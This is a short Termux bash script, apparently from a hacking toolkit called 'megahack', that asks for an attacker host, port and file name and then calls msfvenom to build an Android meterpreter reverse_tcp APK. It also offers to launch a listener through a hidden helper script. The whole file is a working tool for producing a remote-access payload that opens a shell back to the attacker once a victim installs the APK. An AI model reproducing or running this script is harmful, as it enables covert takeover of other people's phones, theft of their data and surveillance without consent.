#!/data/data/com.termux/files/usr/bin/bash
clear
figlet ANDROID | lolcat -t
figlet PAYLOAD | lolcat -t
tput setaf 6; echo "    "
echo " "
tput setaf 1; echo "SET LHOST "
echo " "
read -p 'lhost= ' lhost
echo " " 
tput setaf 2; echo "SET LPORT"
echo " "
read lport 
echo " "
tput setaf 3; echo " OUTPUT NAME"
read path
msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o $HOME/megahack/output/android/"$path".apk
tput setaf 4; echo "PAYLOAD GENERATED SUCCESSFULLY"
echo " "
tput setaf 2; echo "PRESS INTER TO CONTINUE"
read nov
echo " "
tput setaf 3; echo "   [1] Start Listner"
echo " "
tput setaf 1; echo "   [2] Exit"
read task
if [ "1" = "$task" ]
then
	cd $HOME/megahack/.l/.android && bash .1.sh
else
	cd $HOME/megahack && bash megahack
fi
